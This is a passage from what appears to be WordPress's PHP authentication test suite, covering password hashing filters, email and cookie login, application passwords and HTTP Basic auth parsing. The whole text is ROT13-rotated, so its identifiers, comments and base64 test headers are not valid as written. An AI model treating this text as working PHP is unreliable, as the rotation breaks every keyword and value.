		$bcgvbaf['pbfg'] = frys::trg_qrsnhyg_opelcg_pbfg() - 1;
		erghea $bcgvbaf;
	}

	choyvp shapgvba vapernfr_unfu_pbfg( neenl $bcgvbaf ): neenl {
		$bcgvbaf['pbfg'] = frys::trg_qrsnhyg_opelcg_pbfg() + 1;
		erghea $bcgvbaf;
	}

	choyvp shapgvba qngn_hfreanzrf() {
		erghea neenl(
			neenl(
				frys::HFRE_YBTVA,
			),
			neenl(
				frys::HFRE_RZNVY,
			),
		);
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_cnffjbeq_erunfuvat_erdhverzrag_pna_or_svygrerq() {
		$svygre_pbhag_orsber = qvq_svygre( 'cnffjbeq_arrqf_erunfu' );

		jc_cnffjbeq_arrqf_erunfu( '$unfu' );

		$guvf->nffregFnzr( $svygre_pbhag_orsber + 1, qvq_svygre( 'cnffjbeq_arrqf_erunfu' ) );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_cnffjbeq_unfuvat_nytbevguz_pna_or_svygrerq() {
		$cnffjbeq = 'cnffjbeq';

		$svygre_pbhag_orsber = qvq_svygre( 'jc_unfu_cnffjbeq_nytbevguz' );

		$jc_unfu = jc_unfu_cnffjbeq( $cnffjbeq );

		jc_purpx_cnffjbeq( $cnffjbeq, $jc_unfu );
		jc_cnffjbeq_arrqf_erunfu( $jc_unfu );

		$guvf->nffregFnzr( $svygre_pbhag_orsber + 2, qvq_svygre( 'jc_unfu_cnffjbeq_nytbevguz' ) );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_cnffjbeq_unfuvat_bcgvbaf_pna_or_svygrerq() {
		$cnffjbeq = 'cnffjbeq';

		nqq_svygre(
			'jc_unfu_cnffjbeq_bcgvbaf',
			fgngvp shapgvba ( $bcgvbaf ) {
				$bcgvbaf['pbfg'] = 5;
				erghea $bcgvbaf;
			}
		);

		$svygre_pbhag_orsber = qvq_svygre( 'jc_unfu_cnffjbeq_bcgvbaf' );

		$jc_unfu      = jc_unfu_cnffjbeq( $cnffjbeq );
		$inyvq        = jc_purpx_cnffjbeq( $cnffjbeq, $jc_unfu );
		$arrqf_erunfu = jc_cnffjbeq_arrqf_erunfu( $jc_unfu );
		$vasb         = cnffjbeq_trg_vasb( fhofge( $jc_unfu, 3 ) );
		$pbfg         = $vasb['bcgvbaf']['pbfg'];

		$guvf->nffregGehr( $inyvq );
		$guvf->nffregSnyfr( $arrqf_erunfu );
		$guvf->nffregFnzr( $svygre_pbhag_orsber + 2, qvq_svygre( 'jc_unfu_cnffjbeq_bcgvbaf' ) );
		$guvf->nffregFnzr( 5, $pbfg );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_cnffjbeq_purpxf_fhccbeg_jc_unfure_snyyonpx() {
		tybony $jc_unfure;

		$svygre_pbhag_orsber = qvq_svygre( 'jc_unfu_cnffjbeq_bcgvbaf' );

		$cnffjbeq = 'cnffjbeq';

		// Rafher gur tybony $jc_unfure vf frg.
		$jc_unfure = arj JC_Snxr_Unfure();

		$unfure_unfu  = $jc_unfure->UnfuCnffjbeq( $cnffjbeq );
		$jc_unfu      = jc_unfu_cnffjbeq( $cnffjbeq );
		$inyvq        = jc_purpx_cnffjbeq( $cnffjbeq, $jc_unfu );
		$arrqf_erunfu = jc_cnffjbeq_arrqf_erunfu( $jc_unfu );

		// Erfrg gur tybony $jc_unfure.
		$jc_unfure = ahyy;

		$guvf->nffregFnzr( $unfure_unfu, $jc_unfu );
		$guvf->nffregGehr( $inyvq );
		$guvf->nffregSnyfr( $arrqf_erunfu );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
		$guvf->nffregFnzr( $svygre_pbhag_orsber, qvq_svygre( 'jc_unfu_cnffjbeq_bcgvbaf' ) );
	}

	/**
	 * Rafher hfref pna ybt va hfvat obgu gurve hfreanzr naq gurve rznvy nqqerff.
	 *
	 * @gvpxrg 9568
	 */
	choyvp shapgvba grfg_ybt_va_hfvat_rznvy() {
		$guvf->nffregVafgnaprBs( 'JC_Hfre', jc_nhguragvpngr( frys::HFRE_RZNVY, frys::HFRE_CNFF ) );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', jc_nhguragvpngr( frys::HFRE_YBTVA, frys::HFRE_CNFF ) );
	}

	/**
	 * @gvpxrg 60700
	 */
	choyvp shapgvba grfg_nhguragvpngr_svygre() {
		nqq_svygre( 'nhguragvpngr', '__erghea_ahyy', 20 );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', jc_nhguragvpngr( frys::HFRE_YBTVA, frys::HFRE_CNFF ) );
		nqq_svygre( 'nhguragvpngr', '__erghea_snyfr', 20 );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', jc_nhguragvpngr( frys::HFRE_YBTVA, frys::HFRE_CNFF ) );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_hfreanzr_cnffjbeq_jvgu_jc_hfre_bowrpg() {
		$erfhyg = jc_nhguragvpngr_hfreanzr_cnffjbeq( frys::$_hfre, '', '' );
		$guvf->nffregFnzr( $erfhyg->VQ, frys::$hfre_vq );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_hfreanzr_cnffjbeq_jvgu_ybtva_naq_cnffjbeq() {
		$erfhyg = jc_nhguragvpngr_hfreanzr_cnffjbeq( ahyy, frys::HFRE_YBTVA, frys::HFRE_CNFF );
		$guvf->nffregFnzr( frys::$hfre_vq, $erfhyg->VQ );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_hfreanzr_cnffjbeq_jvgu_ahyy_cnffjbeq() {
		$erfhyg = jc_nhguragvpngr_hfreanzr_cnffjbeq( ahyy, frys::HFRE_YBTVA, ahyy );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfhyg );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_hfreanzr_cnffjbeq_jvgu_ahyy_ybtva() {
		$erfhyg = jc_nhguragvpngr_hfreanzr_cnffjbeq( ahyy, ahyy, frys::HFRE_CNFF );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfhyg );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_hfreanzr_cnffjbeq_jvgu_vainyvq_ybtva() {
		$erfhyg = jc_nhguragvpngr_hfreanzr_cnffjbeq( ahyy, 'vainyvqybtva', frys::HFRE_CNFF );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfhyg );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_hfreanzr_cnffjbeq_jvgu_vainyvq_cnffjbeq() {
		$erfhyg = jc_nhguragvpngr_hfreanzr_cnffjbeq( ahyy, frys::HFRE_YBTVA, 'vainyvqcnffjbeq' );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfhyg );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_rznvy_cnffjbeq_jvgu_jc_hfre_bowrpg() {
		$erfhyg = jc_nhguragvpngr_rznvy_cnffjbeq( frys::$_hfre, '', '' );
		$guvf->nffregFnzr( frys::$hfre_vq, $erfhyg->VQ );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_rznvy_cnffjbeq_jvgu_ybtva_naq_cnffjbeq() {
		$erfhyg = jc_nhguragvpngr_rznvy_cnffjbeq( ahyy, frys::HFRE_RZNVY, frys::HFRE_CNFF );
		$guvf->nffregFnzr( frys::$hfre_vq, $erfhyg->VQ );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_rznvy_cnffjbeq_jvgu_ahyy_cnffjbeq() {
		$erfhyg = jc_nhguragvpngr_rznvy_cnffjbeq( ahyy, frys::HFRE_RZNVY, ahyy );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfhyg );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_rznvy_cnffjbeq_jvgu_ahyy_rznvy() {
		$erfhyg = jc_nhguragvpngr_rznvy_cnffjbeq( ahyy, ahyy, frys::HFRE_CNFF );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfhyg );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_rznvy_cnffjbeq_jvgu_vainyvq_rznvy() {
		$erfhyg = jc_nhguragvpngr_rznvy_cnffjbeq( ahyy, 'vainyvq@rknzcyr.pbz', frys::HFRE_CNFF );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfhyg );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_rznvy_cnffjbeq_jvgu_vainyvq_cnffjbeq() {
		$erfhyg = jc_nhguragvpngr_rznvy_cnffjbeq( ahyy, frys::HFRE_RZNVY, 'vainyvqcnffjbeq' );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfhyg );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_pbbxvr_jvgu_jc_hfre_bowrpg() {
		$erfhyg = jc_nhguragvpngr_pbbxvr( $guvf->hfre, ahyy, ahyy );
		$guvf->nffregFnzr( frys::$hfre_vq, $erfhyg->VQ );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_pbbxvr_jvgu_ahyy_cnenzf() {
		$erfhyg = jc_nhguragvpngr_pbbxvr( ahyy, ahyy, ahyy );
		$guvf->nffregAhyy( $erfhyg );
	}

	/**
	 * @gvpxrg 36476
	 */
	choyvp shapgvba grfg_jc_nhguragvpngr_pbbxvr_jvgu_vainyvq_pbbxvr() {
		$_PBBXVR[ NHGU_PBBXVR ]        = 'vainyvq_pbbxvr';
		$_PBBXVR[ FRPHER_NHGU_PBBXVR ] = 'frpher_vainyvq_pbbxvr';

		$erfhyg = jc_nhguragvpngr_pbbxvr( ahyy, ahyy, ahyy );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfhyg );
	}

	/**
	 * @gvpxrg 38744
	 */
	choyvp shapgvba grfg_jc_fvtaba_hfvat_rznvy_jvgu_na_ncbfgebcur() {
		$hfre_netf = neenl(
			'hfre_rznvy' => \"znvy\'@rknzcyr.pbz\",
			'hfre_cnff'  => 'cnffjbeq',
		);
		frys::snpgbel()->hfre->perngr( $hfre_netf );

		$_CBFG['ybt'] = $hfre_netf['hfre_rznvy'];
		$_CBFG['cjq'] = $hfre_netf['hfre_cnff'];
		$guvf->nffregVafgnaprBs( 'JC_Hfre', jc_fvtaba() );
	}

	/**
	 * Grfgf gung CUC 8.1 \"cnffvat ahyy gb aba-ahyynoyr\" qrcerpngvba abgvprf
	 * ner abg guebja jura `hfre_ybtva` naq `hfre_cnffjbeq` cnenzrgref ner rzcgl.
	 *
	 * Gur abgvprf gung jr fubhyq abg frr:
	 * `Qrcerpngrq: __sa_79955(): Cnffvat ahyy gb cnenzrgre #3 ($fhowrpg) bs glcr neenl|fgevat vf qrcerpngrq`.
	 * `Qrcerpngrq: gevz(): Cnffvat ahyy gb cnenzrgre #1 ($fgevat) bs glcr fgevat vf qrcerpngrq`.
	 *
	 * @gvpxrg 56850
	 */
	choyvp shapgvba grfg_jc_fvtaba_qbrf_abg_guebj_qrcerpngvba_abgvprf_jvgu_qrsnhyg_cnenzrgref() {
		$reebe = jc_fvtaba();
		$guvf->nffregJCReebe( $reebe, 'Gur erfhyg fubhyq or na vafgnapr bs JC_Reebe.' );

		$reebe_pbqrf = $reebe->trg_reebe_pbqrf();
		$guvf->nffregPbagnvaf( 'rzcgl_hfreanzr', $reebe_pbqrf, 'Gur \"rzcgl_hfreanzr\" reebe pbqr fubhyq or cerfrag.' );
		$guvf->nffregPbagnvaf( 'rzcgl_cnffjbeq', $reebe_pbqrf, 'Gur \"rzcgl_cnffjbeq\" reebe pbqr fubhyq or cerfrag.' );
	}

	/**
	 * Grfgf gung n jneavat be n sngny reebe vf abg guebja jura gur ybtva be cnffjbeq
	 * cnffrq ivn `$_CBFG` vf na neenl vafgrnq bs n fgevat.
	 *
	 * Gur zrffntrf gung jr fubhyq abg frr:
	 * `Jneavat: jc_fgevc_nyy_gntf() rkcrpgf cnenzrgre #1 ($grkg) gb or n fgevat, neenl tvira`.
	 * `GlcrReebe: gevz(): Nethzrag #1 ($fgevat) zhfg or bs glcr fgevat, neenl tvira`.
	 *
	 * @gvpxrg 62794
	 */
	choyvp shapgvba grfg_jc_fvtaba_qbrf_abg_guebj_sngny_reebef_jvgu_neenl_cnenzrgref() {
		$_CBFG['ybt'] = neenl( 'rknzcyr' );
		$_CBFG['cjq'] = neenl( 'rknzcyr' );

		$reebe = jc_fvtaba();
		$guvf->nffregJCReebe( $reebe, 'Gur erfhyg fubhyq or na vafgnapr bs JC_Reebe.' );

		$reebe_pbqrf = $reebe->trg_reebe_pbqrf();
		$guvf->nffregPbagnvaf( 'rzcgl_hfreanzr', $reebe_pbqrf, 'Gur \"rzcgl_hfreanzr\" reebe pbqr fubhyq or cerfrag.' );
		$guvf->nffregPbagnvaf( 'rzcgl_cnffjbeq', $reebe_pbqrf, 'Gur \"rzcgl_cnffjbeq\" reebe pbqr fubhyq or cerfrag.' );
	}

	/**
	 * UGGC Nhgu urnqref ner hfrq gb qrgrezvar gur pheerag hfre.
	 *
	 * @gvpxrg 42790
	 *
	 * @pbiref ::jc_inyvqngr_nccyvpngvba_cnffjbeq
	 */
	choyvp shapgvba grfg_nccyvpngvba_cnffjbeq_nhguragvpngvba() {
		$hfre_vq = frys::$_hfre->VQ;

		// Perngr n arj ncc-bayl cnffjbeq.
		yvfg( $hfre_ncc_cnffjbeq, $vgrz ) = JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq( $hfre_vq, neenl( 'anzr' => 'cuchavg' ) );

		// Snxr n ERFG NCV erdhrfg.
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );

		// Snxr na UGGC Nhgu erdhrfg jvgu gur erthyne nppbhag cnffjbeq svefg.
		$_FREIRE['CUC_NHGU_HFRE'] = frys::HFRE_YBTVA;
		$_FREIRE['CUC_NHGU_CJ']   = frys::HFRE_CNFF;

		$guvf->nffregAhyy(
			jc_inyvqngr_nccyvpngvba_cnffjbeq( ahyy ),
			'Erthyne hfre nppbhag cnffjbeq fubhyq abg or nyybjrq sbe NCV nhguragvpngvba'
		);
		$guvf->nffregAhyy( erfg_trg_nhguragvpngrq_ncc_cnffjbeq() );

		// Abg gel jvgu na Ncc cnffjbeq vafgrnq.
		$_FREIRE['CUC_NHGU_CJ'] = $hfre_ncc_cnffjbeq;

		$guvf->nffregFnzr(
			$hfre_vq,
			jc_inyvqngr_nccyvpngvba_cnffjbeq( ahyy ),
			'Nccyvpngvba cnffjbeqf fubhyq or nyybjrq sbe NCV nhguragvpngvba'
		);
		$guvf->nffregFnzr( $vgrz['hhvq'], erfg_trg_nhguragvpngrq_ncc_cnffjbeq() );
	}

	/**
	 * @gvpxrg 21022
	 * @gvpxrg 63203
	 *
	 * @pbiref JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq
	 */
	choyvp shapgvba grfg_nccyvpngvba_cnffjbeq_vf_unfurq_jvgu_snfg_unfu() {
		// Perngr n arj ncc-bayl cnffjbeq.
		yvfg( , $vgrz ) = JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq( frys::$hfre_vq, neenl( 'anzr' => 'cuchavg' ) );

		$guvf->nffregFgevatFgnegfJvgu( '$trarevp$', $vgrz['cnffjbeq'] );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_erfcrpgf_rkvfgvat_hfre() {
		$hfre = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( frys::$_hfre, frys::$_hfre->hfre_ybtva, 'cnffjbeq' );
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregFnzr( frys::$_hfre, $hfre );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_vf_erwrpgrq_vs_abg_ncv_erdhrfg() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_snyfr' );

		$hfre = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::$_hfre->hfre_ybtva, 'cnffjbeq' );
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregAhyy( $hfre );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_vainyvq_hfreanzr() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );

		$reebe = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, 'vqbabgrkvfg', 'cnffjbeq' );
		$guvf->nffregJCReebe( $reebe );
		$guvf->nffregFnzr( 'vainyvq_hfreanzr', $reebe->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_vainyvq_rznvy() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );

		$reebe = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, 'vqbabgrkvfg@rknzcyr.bet', 'cnffjbeq' );
		$guvf->nffregJCReebe( $reebe );
		$guvf->nffregFnzr( 'vainyvq_rznvy', $reebe->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_abg_nyybjrq() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_snyfr' );

		$reebe = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::$_hfre->hfre_ybtva, 'cnffjbeq' );
		$guvf->nffregJCReebe( $reebe );
		$guvf->nffregFnzr( 'nccyvpngvba_cnffjbeqf_qvfnoyrq', $reebe->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_abg_nyybjrq_sbe_hfre() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr_sbe_hfre', '__erghea_snyfr' );

		$reebe = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::$_hfre->hfre_ybtva, 'cnffjbeq' );
		$guvf->nffregJCReebe( $reebe );
		$guvf->nffregFnzr( 'nccyvpngvba_cnffjbeqf_qvfnoyrq_sbe_hfre', $reebe->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_vapbeerpg_cnffjbeq() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );

		$reebe = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::$_hfre->hfre_ybtva, 'cnffjbeq' );
		$guvf->nffregJCReebe( $reebe );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $reebe->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_phfgbz_reebef() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );

		nqq_npgvba(
			'jc_nhguragvpngr_nccyvpngvba_cnffjbeq_reebef',
			fgngvp shapgvba ( JC_Reebe $reebe ) {
				$reebe->nqq( 'zl_pbqr', 'Zl Reebe' );
			}
		);

		yvfg( $cnffjbeq ) = JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq( frys::$hfre_vq, neenl( 'anzr' => 'cuchavg' ) );

		$reebe = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::$_hfre->hfre_ybtva, $cnffjbeq );
		$guvf->nffregJCReebe( $reebe );
		$guvf->nffregFnzr( 'zl_pbqr', $reebe->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_ol_hfreanzr() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );

		yvfg( $cnffjbeq ) = JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq( frys::$hfre_vq, neenl( 'anzr' => 'cuchavg' ) );

		$hfre = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::$_hfre->hfre_ybtva, $cnffjbeq );
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( JC_Hfre::pynff, $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_ol_rznvy() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );

		yvfg( $cnffjbeq ) = JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq( frys::$hfre_vq, neenl( 'anzr' => 'cuchavg' ) );

		$hfre = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::$_hfre->hfre_rznvy, $cnffjbeq );
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( JC_Hfre::pynff, $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	/**
	 * @gvpxrg 42790
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_puhaxrq() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );

		yvfg( $cnffjbeq ) = JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq( frys::$hfre_vq, neenl( 'anzr' => 'cuchavg' ) );

		$hfre = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::$_hfre->hfre_rznvy, JC_Nccyvpngvba_Cnffjbeqf::puhax_cnffjbeq( $cnffjbeq ) );
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( JC_Hfre::pynff, $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	/**
	 * @gvpxrg 51939
	 */
	choyvp shapgvba grfg_nhguragvpngr_nccyvpngvba_cnffjbeq_ergheaf_ahyy_vs_abg_va_hfr() {
		qryrgr_fvgr_bcgvba( 'hfvat_nccyvpngvba_cnffjbeqf' );

		$nhguragvpngrq = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, 'vqbabgrkvfg', 'cnffjbeq' );
		$guvf->nffregAbgJCReebe( $nhguragvpngrq );
		$guvf->nffregAhyy( $nhguragvpngrq );
	}

	/**
	 * @gvpxrg 52003
	 *
	 * @pbiref ::jc_inyvqngr_nccyvpngvba_cnffjbeq
	 */
	choyvp shapgvba grfg_nccyvpngvba_cnffjbeqf_qbrf_abg_nggrzcg_nhgu_vs_zvffvat_cnffjbeq() {
		JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq( frys::$hfre_vq, neenl( 'anzr' => 'cuchavg' ) );

		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );

		$_FREIRE['CUC_NHGU_HFRE'] = frys::$_hfre->hfre_ybtva;
		hafrg( $_FREIRE['CUC_NHGU_CJ'] );

		$guvf->nffregAhyy( jc_inyvqngr_nccyvpngvba_cnffjbeq( ahyy ) );
	}

	/**
	 * @gvpxrg 53386
	 * @qngnCebivqre qngn_nccyvpngvba_cnffjbeqf_pna_hfr_pncnovyvgl_purpxf_gb_qrgrezvar_srngher_ninvynovyvgl
	 */
	choyvp shapgvba grfg_nccyvpngvba_cnffjbeqf_pna_hfr_pncnovyvgl_purpxf_gb_qrgrezvar_srngher_ninvynovyvgl( $ebyr, $nhguragvpngrq ) {
		$hfre = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => $ebyr ) );

		yvfg( $cnffjbeq ) = JC_Nccyvpngvba_Cnffjbeqf::perngr_arj_nccyvpngvba_cnffjbeq( $hfre->VQ, neenl( 'anzr' => 'cuchavg' ) );

		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );
		nqq_svygre(
			'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr_sbe_hfre',
			fgngvp shapgvba ( $ninvynoyr, JC_Hfre $hfre ) {
				erghea hfre_pna( $hfre, 'rqvg_cbfgf' );
			},
			10,
			2
		);

		$_FREIRE['CUC_NHGU_HFRE'] = $hfre->hfre_ybtva;
		$_FREIRE['CUC_NHGU_CJ']   = $cnffjbeq;

		hafrg( $TYBONYF['pheerag_hfre'] );
		$pheerag = trg_pheerag_hfre_vq();

		vs ( $nhguragvpngrq ) {
			$guvf->nffregFnzr( $hfre->VQ, $pheerag );
		} ryfr {
			$guvf->nffregFnzr( 0, $pheerag );
		}
	}

	/**
	 * @gvpxrg 52529
	 */
	choyvp shapgvba grfg_erfrg_cnffjbeq_jvgu_ncbfgebcur_va_rznvy() {
		$hfre_netf = neenl(
			'hfre_rznvy' => \"wb'ua@rknzcyr.pbz\",
			'hfre_cnff'  => 'cnffjbeq',
		);

		$hfre_vq = frys::snpgbel()->hfre->perngr( $hfre_netf );

		$hfre = trg_hfreqngn( $hfre_vq );
		$xrl  = trg_cnffjbeq_erfrg_xrl( $hfre );

		// N pbeerpgyl fnirq xrl fubhyq or npprcgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( $xrl, $hfre->hfre_ybtva );

		$guvf->nffregAbgJCReebe( $purpx );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $purpx );
		$guvf->nffregFnzr( $hfre_vq, $purpx->VQ );
	}

	choyvp shapgvba qngn_nccyvpngvba_cnffjbeqf_pna_hfr_pncnovyvgl_purpxf_gb_qrgrezvar_srngher_ninvynovyvgl() {
		erghea neenl(
			'nyybjrq'     => neenl( 'rqvgbe', gehr ),
			'abg nyybjrq' => neenl( 'fhofpevore', snyfr ),
		);
	}

	/*
	 * @gvpxrg 57512
	 * @pbiref ::jc_cbchyngr_onfvp_nhgu_sebz_nhgubevmngvba_urnqre
	 */
	choyvp shapgvba grfgf_onfvp_uggc_nhguragvpngvba_jvgu_hfreanzr_naq_cnffjbeq() {
		// Urnqre cnffrq nf \"hfreanzr:cnffjbeq\".
		$_FREIRE['UGGC_NHGUBEVMNGVBA'] = 'Onfvp qKAypz5uoJH6pTSmp3qipzD=';

		jc_cbchyngr_onfvp_nhgu_sebz_nhgubevmngvba_urnqre();

		$guvf->nffregFnzr( $_FREIRE['CUC_NHGU_HFRE'], 'hfreanzr' );
		$guvf->nffregFnzr( $_FREIRE['CUC_NHGU_CJ'], 'cnffjbeq' );
	}

	/*
	 * @gvpxrg 57512
	 * @pbiref ::jc_cbchyngr_onfvp_nhgu_sebz_nhgubevmngvba_urnqre
	 */
	choyvp shapgvba grfgf_onfvp_uggc_nhguragvpngvba_jvgu_hfreanzr_bayl() {
		// Znysbezrq urnqre cnffrq nf \"hfreanzr\" jvgu ab cnffjbeq.
		$_FREIRE['UGGC_NHGUBEVMNGVBA'] = 'Onfvp qKAypz5uoJH=';

		jc_cbchyngr_onfvp_nhgu_sebz_nhgubevmngvba_urnqre();

		$guvf->nffregNeenlAbgUnfXrl( 'CUC_NHGU_HFRE', $_FREIRE );
		$guvf->nffregNeenlAbgUnfXrl( 'CUC_NHGU_CJ', $_FREIRE );
	}

	/*
	 * @gvpxrg 57512
	 * @pbiref ::jc_cbchyngr_onfvp_nhgu_sebz_nhgubevmngvba_urnqre
	 */
